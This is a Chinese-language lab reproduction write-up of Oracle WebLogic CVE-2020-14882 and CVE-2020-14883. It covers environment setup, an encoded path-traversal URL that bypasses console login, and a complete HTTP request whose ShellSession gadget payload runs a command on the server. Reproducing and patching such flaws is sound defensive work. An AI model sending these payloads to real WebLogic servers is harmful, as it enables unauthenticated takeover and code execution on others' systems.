# 0x00简介

WebLogic是美国Oracle公司出品的一个application
server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java
Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

Weblogic对比Tomcat![](https://image.3001.net/images/20201110/1605007874_5faa7a02b76eb922744df.png!small)

# 0x01漏洞概述

### CVE-2020-14882: 代码执行漏洞

远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console，并在 WebLogic Server
Console 执行任意代码。

### CVE-2020-14883: 权限绕过漏洞

远程攻击者可以构造特殊的HTTP请求，在未经身份验证的情况下接管 WebLogic Server Console。

# 0x02影响版本

Oracle:Weblogic:

10.3.6.0.0

12.1.3.0.0

12.2.1.3.0

12.2.1.4.0

14.1.1.0.0

# 0x03环境搭建

Windows2016+WebLogic12.2.1.4

1.在Oracle官方下载，WebLogic12.2.1.4版本

https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

![](https://image.3001.net/images/20201110/1605008548_5faa7ca4c6921e366ccfc.jpg!small)

2.安装weblogic需要java环境，这里java版本为jdk1.8.0_191

![](https://image.3001.net/images/20201110/1605008559_5faa7caf7765986a5cdeb.jpg!small)

3.java环境安装完成后使用管理员权限运行WebLogic安装

java -jar fmw_12.2.1.4.0_wls_lite_generic.jar

![](https://image.3001.net/images/20201110/1605008568_5faa7cb85393b26200aa0.jpg!small)

4.安装时选择下一步即可，在“安装类型”中选择“含示例的完整安装”

![](https://image.3001.net/images/20201110/1605008578_5faa7cc282aaf1cc07eea.jpg!small)

![](https://image.3001.net/images/20201110/1605008587_5faa7ccb1d69d4315c3e0.jpg!small)

5.在配置向导中，设置密码，点击创建即可

![](https://image.3001.net/images/20201110/1605008594_5faa7cd2ed7898fcf55bc.jpg!small)

![](https://image.3001.net/images/20201110/1605008603_5faa7cdb67203243a1c9e.jpg!small)

6.安装完成后，在浏览器访问127.0.0.1:7001/console 出现如下界面即可

![](https://image.3001.net/images/20201110/1605008613_5faa7ce59930a19f2c76e.jpg!small)

# 0x04漏洞复现

### 1.CVE-2020-14883: 权限绕过漏洞

1.1 低权限的用户访问以下URL，通过未授权访问到管理后台页面

http://192.168.207.149:7001/console/css/%252e%252e%252fconsole.portal![](https://image.3001.net/images/20201110/1605008625_5faa7cf16fcbb9d4b67b9.jpg!small)

### 2\. CVE-2020-14882: 代码执行漏洞

2.1 在首页使用burp抓取数据包，然后发送到Repeater模块构造payload

![](https://image.3001.net/images/20201110/1605008638_5faa7cfe637a22febabef.jpg!small)

2.2 在url处通过非法字符绕过访问，然后通过Gadget调用命令执行

> Payload:
> /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)

完整数据包如下：

> GET
> /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22)
> HTTP/1.1
>
> Host: 192.168.207.149:7001
>
> Pragma: no-cache
>
> Cache-Control: no-cache
>
> Upgrade-Insecure-Requests: 1
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
> (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
>
> Accept:
> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-> exchange;v=b3;q=0.9
>
> Accept-Encoding: gzip, deflate
>
> Accept-Language: zh-CN,zh;q=0.9
>
> Cookie:
> ADMINCONSOLESESSION=_i6RW6CkwbR8Zr7DOmC0qhwkfhOdOVZiWlubIcjtgogLbSWVXCAl!-1560292457;
> think_lang=zh-cn; PHPSESSID=0701339d3e42f0edcf094f63a3919f90;
> JSESSIONID=z3-RYQeKtqCOmUfkcph4xyWXJWfYJQ-6E19wRWMHtS2JPtA14MaH!-1560292457
>
> Connection: close

![](https://image.3001.net/images/20201110/1605008786_5faa7d9276d9e4896a4eb.jpg!small)

3\. 点击“发送”，在服务器稍等一下可以看到弹出了计算器

![](https://image.3001.net/images/20201110/1605008802_5faa7da25ca066b58de9f.jpg!small)

![](https://image.3001.net/images/20201110/1605008812_5faa7dac802c7f9a1a245.jpg!small)

注：在linux中可以通过构造payload实现反弹shell

 ****

# 0x05修复建议

1\. 在Oracle官方下载最新的漏洞补丁

https://support.oracle.com/portal/

